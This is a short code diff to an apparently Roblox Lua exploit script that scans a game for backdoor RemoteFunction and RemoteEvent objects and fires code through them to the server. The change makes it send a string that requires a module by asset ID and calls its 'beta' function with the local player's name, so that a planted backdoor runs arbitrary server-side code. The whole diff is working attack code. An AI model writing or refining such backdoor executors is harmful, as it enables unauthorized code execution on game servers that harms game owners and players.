@@ -43,10 +43,11 @@ local function executeServerRequire(scriptID)
     local backdoors = scanForBackdoors()
     for _, backdoor in ipairs(backdoors) do
         local success, result = pcall(function()
+            local code = ('require(%s).beta("%s")'):format(scriptID, game.Players.LocalPlayer.Name)
             if backdoor:IsA("RemoteFunction") then
-                return backdoor:InvokeServer(require(scriptID))
+                return backdoor:InvokeServer(code)
             elseif backdoor:IsA("RemoteEvent") then
-                backdoor:FireServer(require(scriptID))
+                backdoor:FireServer(code)
                 return "[SUCCESS] Fired RemoteEvent"
             else
                 error("[ERROR] No suitable RemoteFunction or RemoteEvent found for backdoor: " .. backdoor:GetFullName())
